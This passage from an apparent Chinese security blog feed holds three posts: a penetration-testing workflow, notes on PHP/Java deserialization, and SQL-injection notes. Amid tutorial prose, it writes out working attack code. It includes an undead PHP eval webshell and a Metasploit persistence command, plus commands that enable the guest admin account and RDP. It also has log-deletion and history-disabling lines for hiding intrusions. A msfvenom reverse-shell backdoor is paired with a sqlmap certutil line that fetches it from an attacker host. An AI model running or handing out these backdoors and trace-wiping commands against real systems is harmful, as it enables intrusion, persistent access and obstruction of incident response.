AWVS、AppScan、OWASP-ZAP、nessuss等等。但是需要注意的是，使用漏扫工具直接对网站进行扫描，因为一下子流量过大，有些网站可能会崩溃。所以一般最好不要使用漏洞扫描工具对网站进行扫描。并且如果未经授权就用漏扫对网站进行扫描还是违法的！</p><p><strong>6.网站指纹识别</strong></p><p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。</p><p>常见的网站指纹识别工具有：whatweb等。</p><p><strong>7.公司敏感信息网上搜集</strong></p><p>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。</p><p><strong>8.域名信息的收集</strong></p><p>当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。</p><p>判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：多个地点Ping服务器,网站测速 - 站长工具 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。</p><p>域名的whois信息：whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名&#x2F;IP的whois信息由对应的管理机构保存。</p><h2 id="三-漏洞探测"><a href="#三-漏洞探测" class="headerlink" title="三 漏洞探测"></a>三 漏洞探测</h2><p>当我们收集到了足够多的信息之后，我们就要开始对网站进行漏洞探测了。探测网站是否存在一些常见的Web漏洞，比如：</p><ul><li>SQL注入</li><li>XSS跨站脚本</li><li>CSRF跨站请求伪造</li><li>XXE漏洞</li><li>SSRF服务端请求伪造漏洞</li><li>文件包含漏洞</li><li>文件上传漏洞</li><li>文件解析漏洞</li><li>远程代码执行漏洞</li><li>CORS跨域资源共享漏洞</li><li>越权访问漏洞</li><li>目录浏览漏洞和任意文件读取&#x2F;下载漏洞</li><li>struts2漏洞</li><li>JAVA反序列化漏洞</li></ul><p>这些是网站经常发现的一些漏洞，还有一些网站漏洞，这里我就不一一列举出来了。</p><p>网站漏洞扫描工具也有很多，比如：</p><ul><li>AWVS</li><li>AppScan</li><li>Owasp-Zap</li><li>Nessus</li></ul><p>网站漏洞扫描工具我就列举这几种，还有很多，最常用的是这几个！</p><h2 id="四-漏洞利用"><a href="#四-漏洞利用" class="headerlink" title="四 漏洞利用"></a>四 漏洞利用</h2><p>当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的webshell，我们往往需要结合几个漏洞来拿webshell。常用的漏洞利用工具如下：</p><p>SQL注入 ——&gt; Sqlmap</p><p>XSS跨站脚本——&gt; Beef-XSS</p><p>抓包改包工具——&gt; Burpsuite工具 、 Fidder抓包软件</p><p>文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——&gt; Webshell和一句话木马</p><p>但是，获得了webshell后，一般权限很低，所以我们需要提权，可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马，也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用， 也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权</p><h2 id="五-内网转发"><a href="#五-内网转发" class="headerlink" title="五 内网转发"></a>五 内网转发</h2><p>当我们获取到了网站的Webshell之后，如果我们想获取该主机的有关信息，我们可以将该主机的webshell换成MSF的shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个MSF类型的shell了。</p><p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。</p><h2 id="六-内网横向渗透"><a href="#六-内网横向渗透" class="headerlink" title="六 内网横向渗透"></a>六 内网横向渗透</h2><p>当我们在获取了外网服务器的权限，进入该系统后，我们要想尽办法从该服务器上查找到我们想要的信息。</p><p>对于windows主机，我们应该多去翻翻目录，或许能有很多意想不到的结果。很多人习惯把账号密码等容易忘的东西存放在备忘录中，或者是桌面上。我们还可以查找数据库的连接文件，查看数据库的连接账号密码等敏感信息。当我们获得了windows主机的账号密码，或者是自己创建了新用户后，我们为了不被网站管理员发现和不破坏服务器。我们尽量不要使用远程桌面。因为使用远程桌面动静比较大，如果此时服务器管理员也在登录，而你此时通过远程桌面登录的话，会将管理员挤掉，而你也将很快的被管理员踢掉。对于实在是要远程桌面登录的情况的话，我们尽量不要新建一个用户进行登录。我们可以激活 guest 用户，然后将其加入 administrators 组里面，用 guest 用户身份登录。在RDP远程登录后，我们可以查看其他用户桌面上和其他目录有哪些软件，我们要找的目标有以下。</p><ul><li>FTP相关的软件</li><li>数据库相关的软件</li><li>打开浏览器，查看历史记录，查看某些网站是否保存有用户密码。利用工具查看浏览器保存的密码</li></ul><p>从该主机上找到的账号密码，我们可以做一个字典，在对内网其他机器进行爆破的时候，很有可能是同密码。</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">net user  guest  /active:yes                      #激活guest用户</span></span><span class="line"><span style="color: #babed8">net localgroup  administrators  guest  /add       #将guest用户添加到</span></span><span class="line"><span style="color: #babed8">net user guest    密码                            #更改guest用户密码</span></span><span class="line"><span style="color: #babed8">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f                          #开启3389端口</span></span></code></pre></div><p>对于Linux主机，我们可以查看开放的端口号，开放的服务，与其建立连接的内网主机。查看目录，查找网站数据库连接密码。总之，就是尽可能的多查找一些账号密码，这对于内网的账号爆破非常有用。</p><p>在搭建了隧道可以通内网后，我们首先就需要对内网进行资产发现了。但是对于内网存活网段的判断是一个大问题。内网很有可能同时存在 10.0.0.0&#x2F;8、172.16.0.0&#x2F;16、192.168.0.0&#x2F;24 网段。这就需要我们用扫描器对其进行探测了。通过代理进行内网扫描不建议使用nmap。如果是在本地主机通过代理扫描，可以图形化界面的话，可以使用 RouterScan 、御剑高速TCP全端口扫描器、IIS_Scanner。但是注意线程调低一点，不然代理很容易崩了。如果使用命令行扫描器的话，可以使用S扫描器。在扫描了内网资产和端口开放情况后，对于445端口，就可以打一波MS17_010。但是注意通过代理打445，和之前的是不一样的。传送门——&gt; 内网渗透之MS17-010 。对于3389端口，可以打一波CVE-2019-0708，传送门——&gt; CVE-2019-0708 远程桌面漏洞复现 。对于1433&#x2F;3306&#x2F;6379等端口，可以尝试爆破，利用之前收集到的账号密码成功率更高哦。</p><p><strong>权限维持</strong></p><p>在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。</p><p><strong>Web后门</strong></p><p>1：隐藏后门文件(将文件设置为隐藏)</p><p>2：不死马，该脚本每5秒向服务器创建test.php，并写入一句话免杀木马。结合attrib命令隐藏文件更好地建立后门。</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">&lt;?php</span></span><span class="line"><span style="color: #babed8">    set_time_limit(0);//程序执行时间</span></span><span class="line"><span style="color: #babed8">    ignore_user_abort(1);//关掉终端后脚本仍然运行</span></span><span class="line"><span style="color: #babed8">    unlink(__FILE__);//文件完整名</span></span><span class="line"><span style="color: #babed8">    while(1)&#123;</span></span><span class="line"><span style="color: #babed8">        file_put_contents(&#39;test.php&#39;,&#39;&lt;?php $a=array($_REQUEST[&quot;x&quot;]=&gt;&quot;3&quot;);</span></span><span class="line"><span style="color: #babed8">        $b=array_keys($a)[0];</span></span><span class="line"><span style="color: #babed8">        eval($b);?&gt;&#39;);</span></span><span class="line"><span style="color: #babed8">        sleep(5);</span></span><span class="line"><span style="color: #babed8">    &#125;</span></span><span class="line"><span style="color: #babed8">?&gt;</span></span></code></pre></div><p>3：404页面隐藏后门，或者在其他自带文件中插入后门代码</p><p>注：以上几种后门方法均能被D盾等工具检测到</p><p><strong>Windows系统</strong></p><p>1：建立隐藏用户，在用户名后加 $</p><p>2：在开机启动目录下放置木马文件，只要目标机器重启，将回连我们的远控</p><p>3：MSF里的 persistence 模块，执行命令可以使目标机器每隔一定时间自动回连远控。但是容易被发现</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span></span><span class="line"><span style="color: #babed8">run persistence -X -i 5 -p 8888 -r 192.168.10.27  </span></span><span class="line"><span style="color: #babed8"> </span></span><span class="line"><span style="color: #babed8">#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span></span></code></pre></div><p>4：在域环境下，想办法获得 krbtgt 用户的哈希，该用户的哈希可以进行票据传递攻击。而且一般该用户的密码不经常改变。</p><p>5：shift后门</p><p>6：远程桌面会话劫持</p><p><strong>Linux系统</strong></p><p>1：SSH后门</p><p>2：crontab定时任务</p><p>3：SSH公钥</p><p>4：创建SUID&#x3D;0的用户</p><h2 id="七-痕迹清除"><a href="#七-痕迹清除" class="headerlink" title="七 痕迹清除"></a>七 痕迹清除</h2><p>当我们达到了目的之后，有时候只是为了黑入网站挂黑页，炫耀一下；或者在网站留下一个后门，作为肉鸡，没事的时候上去溜达溜达；亦或者挂入挖矿木马；但是大家千万不要干这些事，这些都是违法的！</p><p>我这里只是教大家在渗透进去之后如何清除我们留下的一部分痕迹，并不能完全清除，完全清除入侵痕迹是不可能的！主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论你怎么清除，还是能查到的。</p><p>最主要还是要以隐藏自身身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p><p>Windows系统</p><p>1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p><p>2：如果3389远程登录过，需要清除mstsc痕迹</p><p>3：执行命令清除日志：</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">del %WINDR%\* .log /a/s/q/f</span></span></code></pre></div><p>4：如果是web应用，找到web日志文件，删除</p><p>Linux系统</p><p>1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">export HISTFILE=/dev/null export HISTSIZE=0</span></span></code></pre></div><p>2：删除 &#x2F;var&#x2F;log 目录下的日志文件</p><p>3：如果是web应用，找到web日志文件，删除</p><h3 id="八-撰写渗透测试保告"><a href="#八-撰写渗透测试保告" class="headerlink" title="八 撰写渗透测试保告"></a>八 撰写渗透测试保告</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一般来说，渗透测试的基本流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定目标&lt;/li&gt;
&lt;li&gt;信息收集&lt;/li&gt;
&lt;li&gt;漏洞探测&lt;/li&gt;
&lt;li&gt;漏洞利用getshell&lt;/li&gt;
&lt;li&gt;内网转发&lt;/li&gt;
&lt;li&gt;内网渗透&lt;/li&gt;
&lt;li&gt;痕迹清除&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WEB攻防-反序列化</title>
    <link href="https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
    <id>https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</id>
    <published>2024-03-18T13:45:44.000Z</published>
    <updated>2024-04-21T10:30:45.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h4 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h4><p><em><strong>格式转换</strong></em></p><ul><li>序列化: 对象转换为数组或字符串等格式</li><li>反序列化: 将数组或字符串等格式转换成对象</li></ul><p><img src="https://i0.imgs.ovh/2024/03/17/e3gfp.png" alt="e3gfp.png"></p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p><em><strong>魔法方法</strong></em></p><ul><li>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法</li></ul><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #82AAFF">__construct</span><span style="color: #89DDFF">():</span><span style="color: #676E95; font-style: italic">//构造函数，当对象new的时候会自动调用</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__destruct</span><span style="color: #89DDFF">():</span><span style="color: #676E95; font-style: italic">//析构函数当对象被销毁时会被自动调用</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__wakeup</span><span style="color: #89DDFF">():</span><span style="color: #676E95; font-style: italic">//unserialize()时会被自动调用</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__invoke</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__call</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//在对象上下文中调用不可访问的方法时触发</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__callStatci</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//在静态上下文中调用不可访问的方法时触发</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__get</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//用于从不可访问的属性读取数据</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__set</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//用于将数据写入不可访问的属性</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__isset</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//在不可访问的属性上调用isset()或empty()触发</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__unset</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//在不可访问的属性上使用unset()时触发</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__toString</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//把类当作字符串使用时触发</span></span><span class="line"></span><span class="line"><span style="color: #82AAFF">__sleep</span><span style="color: #89DDFF">():</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span></span></code></pre></div><ul><li>演示:</li></ul><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;?</span><span style="color: #BABED8">php</span></span><span class="line"><span style="color: #676E95; font-style: italic">//序列化&amp;反序列化</span></span><span class="line"><span style="color: #C792EA">class</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">demotest</span><span style="color: #89DDFF">&#123;</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #C792EA">public</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">xiaodi</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">;</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #C792EA">public</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">sex</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">man</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">;</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #C792EA">public</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">age</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">29</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">;</span></span><span class="line"><span style="color: #89DDFF">&#125;</span></span><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">example</span><span style="color: #89DDFF">=</span><span style="color: #F78C6C">new</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">demotest</span><span style="color: #89DDFF">();</span></span><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">s</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">serialize</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">example</span><span style="color: #89DDFF">);</span><span style="color: #676E95; font-style: italic">//序列化-&gt;O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;</span></span><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">u</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">unserialize</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">s</span><span style="color: #89DDFF">);</span><span style="color: #676E95; font-style: italic">//反序列化-&gt;object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;</span></span><span class="line"><span style="color: #82AAFF">echo</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">s</span><span style="color: #89DDFF">.&#39;</span><span style="color: #C3E88D">&lt;br&gt;</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">;</span></span><span class="line"><span style="color: #82AAFF">var_dump</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">u</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #82AAFF">echo</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">&lt;br&gt;</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">;</span></span><span class="line"><span style="color: #89DDFF">?&gt;</span></span></code></pre></div><p>创建对象即可触发<code>__construct</code>魔术方法，销毁对象触发<code>__destruct</code>，把类当作字符串使用时触发<code>__toString()</code></p><h4 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h4><p><a href="https://www.anquanke.com/post/id/264823">浅析PHP原生类-安全客 - 安全资讯平台 (anquanke.com)</a></p><h4 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h4><h5 id="wakeup-方法绕过"><a href="#wakeup-方法绕过" class="headerlink" title="__wakeup()方法绕过"></a>__wakeup()方法绕过</h5><ul><li><p>如果存在wakeup方法，调用unserilize()方法前则先调用wakeup方法</p></li><li><p>但是序列化字符串中<strong>表示对象属性个数的值大于真实的属性个数</strong>时会**跳过__wakeup()**的执行</p></li></ul><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span></span><span class="line"><span style="color: #babed8">//修改为</span></span><span class="line"><span style="color: #babed8">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span></span><span class="line"><span style="color: #babed8"></span></span></code></pre></div><h2 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul><li>序列化: Java对象 –&gt; 字节序列</li><li>反序列化: 字节序列 –&gt; Java对象</li></ul><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="Ysoserial"><a href="#Ysoserial" class="headerlink" title="Ysoserial"></a>Ysoserial</h5><ul><li><p><a href="https://github.com/frohoff/ysoserial">frohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)</a></p></li><li><p><a href="https://blog.csdn.net/weixin_46684578/article/details/128499673">【Web安全】Ysoserial 简单利用-CSDN博客</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反序列化&quot;&gt;&lt;a href=&quot;#反序列化&quot; class=&quot;headerlink&quot; title=&quot;反序列化&quot;&gt;&lt;/a&gt;反序列化&lt;/h1&gt;&lt;h4 id=&quot;什么是反序列化&quot;&gt;&lt;a href=&quot;#什么是反序列化&quot; class=&quot;headerlink&quot; title=&quot;什么是</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WEB攻防-通用漏洞</title>
    <link href="https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E.html</id>
    <published>2024-03-05T15:07:08.000Z</published>
    <updated>2024-04-21T12:31:45.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB攻防-通用漏洞"><a href="#WEB攻防-通用漏洞" class="headerlink" title="WEB攻防-通用漏洞"></a>WEB攻防-通用漏洞</h1><p>大型靶场<a href="https://vulhub.org/#/environments/">Vulhub - Docker-Compose file for vulnerability environment</a></p><h2 id="SQL注入-补充内容"><a href="#SQL注入-补充内容" class="headerlink" title="SQL注入-补充内容"></a>SQL注入-补充内容</h2><h3 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h3><h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><h5 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h5><ul><li>知道表名</li><li>不知道列名</li><li>列名特殊, 无法爆破</li></ul><h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><ul><li><p>假设一个表有8个字段，admin表有3个字段。(需要先判断列数)</p></li><li><p>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin </p></li><li><p>在我们不知道admin有多少字段的情况下可以尝试payload：union select 1,2,3,4,5,6,7,admin.* from admin，此时页面出错</p></li><li><p>直到payload：union select 1,2,3,4,5,admin.* from admin时页面返回正常，说明admin表有三个字段</p></li><li><p>然后通过移动admin.*的位置，就可以回显不同的数据</p></li></ul><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><ul><li><p>读取文件</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">select load_file(&#39;D:/a.txt&#39;);</span></span></code></pre></div></li><li><p>写入文件</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">select &#39;xxxx&#39; into outfile &#39;D:/a.txt&#39;;</span></span></code></pre></div></li></ul><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><ul><li><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园 (cnblogs.com)</a></li></ul><h4 id="sqlmap联动msf"><a href="#sqlmap联动msf" class="headerlink" title="sqlmap联动msf"></a>sqlmap联动msf</h4><ul><li><p>攻击者服务器msf生成后门</p><div class="language-bash"><button title="Copy code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">msfvenom</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-p</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">windows/meterpreter/reverse_http</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">lhost=服务器地址</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">lport=端口</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-f</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">exe</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-o</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">sql.exe</span></span></code></pre></div></li><li><p>开启监听：</p><div class="language-bash"><button title="Copy code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">msf6&gt;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">use</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">exploit/multi/handler</span></span><span class="line"><span style="color: #FFCB6B">msf6&gt;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">lhost</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0.0</span><span style="color: #C3E88D">.0.0</span></span><span class="line"><span style="color: #FFCB6B">msf6&gt;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">lport</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">6666</span></span><span class="line"><span style="color: #FFCB6B">msf6&gt;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">run</span></span></code></pre></div></li><li><p>sqlmap实现访问下载后门文件</p><div class="language-bash"><button title="Copy code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">python</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">sqlmap.py</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-u</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">url</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">--os-cmd=</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">certutil -urlcache -split -f http://xxxx/sql.exe c:/sql.exe</span><span style="color: #89DDFF">&quot;</span></span></code></pre></div></li></ul><h4 id="脚本使用"><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h4><p>工具无法自动判断加密&#x2F;编码类型和数据格式(如json), 需要手工注入进行判断</p><ul><li>例如, 用base64编码payload:<div class="language-bash"><button title="Copy code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">python</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">sqlmap.py</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-u</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">url</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">--tamper=base64encode.py</span></span></code></pre></div></li></ul><h4 id="基于堆叠注入-绕过select过滤"><a href="#基于堆叠注入-绕过select过滤" class="headerlink" title="(基于堆叠注入)绕过select过滤"></a>(基于堆叠注入)绕过select过滤</h4><p><a href="https://www.cnblogs.com/cmredkulaa/p/14563311.html">几种绕过select过滤的姿势 - 2hangG3 - 博客园 